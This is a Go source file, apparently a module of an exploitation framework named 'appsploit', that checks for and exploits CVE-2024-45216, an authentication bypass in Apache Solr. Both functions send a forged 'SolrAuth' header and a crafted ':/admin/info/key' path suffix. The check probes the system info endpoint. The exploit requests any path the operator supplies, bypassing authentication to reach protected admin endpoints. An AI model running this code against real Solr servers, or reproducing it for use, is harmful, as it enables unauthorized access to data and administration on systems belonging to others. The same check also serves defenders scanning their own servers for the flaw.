package vul

import (
	"appsploit/pkg/utils"
	appVul "appsploit/pkg/vul"
	"github.com/urfave/cli/v2"
	"strings"
)

type CVE_2024_45216 struct {
	appVul.BaseVulnerability
}

var CVE_2024_45216_v1 = CVE_2024_45216{
	BaseVulnerability: appVul.BaseVulnerability{
		Name:        "CVE-2024-45216",
		Description: "Apache Solr Authentication Bypass - Type: Authentication Bypass",
	},
}

func (cve CVE_2024_45216) CheckSec(ctx *cli.Context) (bool, error) {
	baseURL := utils.Http.FormatURL(ctx)
	httpClient := *utils.Http.Client()
	httpClient.SetHeader("SolrAuth", "test")
	if resp, err := httpClient.Get(baseURL + "/solr/admin/info/system:/admin/info/key?wt=json"); err != nil {
		return false, err
	} else {
		if resp.StatusCode() == 200 && strings.Contains(string(resp.Body()), "solr_home") {
			CVE_2024_45216_v1.VulnerabilityExists = true
			CVE_2024_45216_v1.VulnerabilityResponse = "vulnerability is exists"
		} else {
			CVE_2024_45216_v1.VulnerabilityExists = false
		}
	}
	return CVE_2024_45216_v1.VulnerabilityExists, error(nil)
}

func (cve CVE_2024_45216) Exploit(ctx *cli.Context) (bool, error) {
	baseURL := utils.Http.FormatURL(ctx)
	urlPath := ctx.String("path")
	if vulnerabilityExists, err := cve.CheckSec(ctx); err != nil {
		return CVE_2024_45216_v1.VulnerabilityExists, err
	} else {
		if vulnerabilityExists {
			httpClient := *utils.Http.Client()
			httpClient.SetHeader("SolrAuth", "test")
			if resp, err := httpClient.Get(baseURL + urlPath + ":/admin/info/key?wt=json"); err != nil {
				CVE_2024_45216_v1.VulnerabilityExists = false
				return CVE_2024_45216_v1.VulnerabilityExists, err
			} else {
				CVE_2024_45216_v1.VulnerabilityResponse = resp.String()
			}
		}
	}
	return CVE_2024_45216_v1.VulnerabilityExists, error(nil)
}
